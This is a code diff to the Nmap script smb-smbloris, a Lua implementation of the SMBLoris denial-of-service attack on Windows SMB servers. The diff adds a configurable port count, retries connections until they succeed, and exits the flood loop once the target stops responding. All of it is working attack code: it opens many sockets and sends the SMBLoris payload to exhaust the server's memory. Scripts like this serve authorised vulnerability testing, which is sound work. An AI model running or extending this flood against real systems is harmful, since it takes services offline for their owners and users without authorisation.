@@ -76,6 +76,7 @@ References:
 -- </table>
 -- </script>
 -- @args smb-smbloris.timeout Time in seconds for the script to timeout. Default: 1000
+-- @args smb-smbloris.ports Number of ports to connect from. Default: 20000
 --
 ---
 
@@ -89,6 +90,7 @@ end
 
 local host_down = false
 local TIMEOUT = 1000 -- number of seconds to timeout the attack
+local NUM_PORTS = 20000 -- number of ports to connect from
 local skts = {}
 local CRITICAL_VALUE_99 = 3.3
 local SMBLORIS_PAYLOAD = '\x00\x01\xff\xff'
@@ -162,37 +164,25 @@ local function check_alive(host, mean, ci)
   end
 end
 
-local function send_dos(host, port, src_port)
+local function send_dos(host, port)
   if host_down then
     return
-  end
-
-  local oldsocket = skts[src_port]
-  if oldsocket then
-    oldsocket:close()
   end
 
   local socket = nmap.new_socket()
 
   local try = nmap.new_try()
 
-  stdnse.debug1("Trying to send from %s", src_port)
-
-  -- tries to catch 2 exceptions
-  -- 1) user does not have sufficient permissions to bind to the port
-  -- 2) system already has a service listening on the port
-  try(socket:bind("0.0.0.0", src_port))
+  stdnse.debug1("Number of ports connected: %s", #skts)
 
   local status, err = socket:connect(host, port)
   socket:send(SMBLORIS_PAYLOAD)
   if status then
-    if not oldsocket then
-      table.insert(skts, socket)
-    else
-      skts[src_port] = socket
-    end
+    table.insert(skts, socket)
+  else
+    -- do until it succeeds
+    send_dos(host, port)
   end
-
 end
 
 action = function(host)
@@ -218,6 +208,8 @@ All modern versions of Windows, at least from Windows 2000 through Windows 10, a
 
   local timeout = tonumber(stdnse.get_script_args(SCRIPT_NAME .. '.timeout'))
     or TIMEOUT
+  local num_ports = tonumber(stdnse.get_script_args(SCRIPT_NAME .. '.ports'))
+    or NUM_PORTS
   local script_start = nmap.clock()
   local mean, ci = set_baseline(host)
 
@@ -228,23 +220,24 @@ All modern versions of Windows, at least from Windows 2000 through Windows 10, a
 
   stdnse.debug1("Mean: %s, 99%% interval: ± %s", mean, ci)
   local timed_out = false
-  while not timed_out or not host_down do
-    -- using 65000 instead of 65535 prevents crash of too many files open
-    for i=1, 65000, 1 do
-      send_dos(host, port, i)
+  -- each port allocates 128KiB
+  -- max is 65000 instead of 65535 prevents crash of too many files open
+  for i=1, num_ports, 1 do
+    send_dos(host, port)
 
-      if i % 1000 == 0 and i <= 60000 then
-        -- prevents crash when i >= 61000
-        check_alive(host, mean, ci)
-      end
+    if i % 1000 == 0 and i <= 60000 then
+      -- prevents crash when i >= 61000
+      check_alive(host, mean, ci)
+      if host_down then break end
+    end
 
-      -- has it timed out yet?
-      if nmap.clock() - timeout >= script_start then
-        stdnse.debug1("Script timed out at %s", timeout)
-        break
-      end
+    -- has it timed out yet?
+    if nmap.clock() - timeout >= script_start then
+      stdnse.debug1("Script timed out at %s", timeout)
+      break
     end
   end
+
   if host_down then
     vuln.state = vulns.STATE.VULN
   end
